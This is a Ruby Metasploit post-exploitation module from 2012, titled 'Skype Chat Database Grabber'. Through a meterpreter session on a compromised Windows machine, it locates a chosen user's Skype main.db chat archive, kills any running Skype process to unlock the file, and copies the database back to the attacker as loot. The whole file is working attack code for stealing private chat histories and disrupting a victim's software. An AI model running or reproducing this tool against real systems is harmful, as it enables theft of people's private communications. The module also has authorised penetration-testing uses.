# $Id: bitcoin_jacker.rb 14774 2012-02-21 01:42:17Z rapid7 $

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/user_profiles'

class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::UserProfiles

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Skype Chat Database Grabber',
				'Description'   => %q{
					This module downloads the Main.db file for selected Skype user, which is where chats are archived.  
					The db file can be examined with third-party tools.
					I borrowed heavily from bannedit's BitCoin Jacker:
						- Credit for what works:  bannedit
						- Credit for what doesn't: JonValt

				},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'JonValt <Twitter @JonValt>'],
				'Version'       => '$Revision: 14774 $',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
 register_options(
    [
     	OptString.new('username',[true,'Skype User Name',nil]),
    ], self.class)

	end


#todo: Automagically get all users' databases

	def run
		print_status("Version 04-12-2012 1226 at your service, Sir!")
		skype_username = datastore['username']
		print_status("Finding User Folder...")
		grab_user_profiles().each do |user|
			next if user['AppData'] == nil


			tmpath= user['AppData'] + "\\skype\\" + skype_username + "\\main.db"
			grab_skype(tmpath)
		end
	end

	def grab_skype(filename)
		data     = ""
		found    = session.fs.file.stat(filename) rescue nil
		return if not found

		print_status("Database File Found At #{filename}, Sir!")
		print_status("Allow me to fetch it for you...")
		print_status("Checking to see if Skype is running...")
		
		kill_skype

		begin
			dbfile = session.fs.file.new(filename, "rb")
			until dbfile.eof?
				data << dbfile.read
			end

			store_loot("main.db", "application/octet-stream", session, data, filename, "Skype DB File")
			print_status("All done.  It was a pleasure to serve you, Sir!.")
		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_error("Alas, something is amiss - I was unable to copy #{filename}: #{e.class} #{e}")
		end
	end

	def kill_skype
		client.sys.process.get_processes().each do |x|
			if x['name'].downcase == "skype.exe"
				print_status("     #{x['name']} Process Found...")
				print_status("     Killing Process ID #{x['pid']}...")
				session.sys.process.kill(x['pid']) rescue nil
			end
		end
	end

end
